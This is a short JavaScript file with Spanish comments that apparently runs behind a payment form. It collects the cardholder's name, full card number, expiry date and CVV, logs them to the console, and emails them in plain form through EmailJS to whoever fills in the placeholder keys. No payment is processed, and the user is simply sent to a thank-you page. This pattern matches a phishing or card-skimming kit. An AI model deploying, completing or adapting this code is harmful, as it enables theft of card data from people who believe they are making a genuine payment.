// Configuración INICIAL de EmailJS (REEMPLAZAR CON TUS DATOS)
emailjs.init('TU_PUBLIC_KEY'); // Obtén esto desde EmailJS

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // 1. CAPTURAR DATOS
    const datos = {
        nombre_completo: document.getElementById('nombre').value.trim(),
        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
        fecha_expiracion: document.getElementById('fecha').value,
        codigo_cvv: document.getElementById('cvv').value
    };

    console.log('Datos capturados:', datos); // Para verificar en consola

    // 2. VALIDACIÓN
    if (!/^[A-ZÁÉÍÓÚÑ\s]{5,}$/.test(datos.nombre_completo)) {
        alert('Nombre inválido');
        return;
    }

    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
        alert('Tarjeta inválida');
        return;
    }

    if (new Date(datos.fecha_expiracion) < new Date()) {
        alert('Fecha expirada');
        return;
    }

    if (!/^\d{4}$/.test(datos.codigo_cvv)) {
        alert('CVV inválido');
        return;
    }

    // 3. ENVIAR CORREO (CONFIGURAR EN EMAILJS)
    document.getElementById('mensajeCarga').style.display = 'block';

    emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('Error al enviar. Verifica la consola.');
        })
        .finally(() => {
            document.getElementById('mensajeCarga').style.display = 'none';
        });
});

// Formatear número de tarjeta
document.getElementById('tarjeta').addEventListener('input', function(e) {
    let valor = e.target.value.replace(/\s/g, '');
    valor = valor.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = valor.substring(0, 19);
});
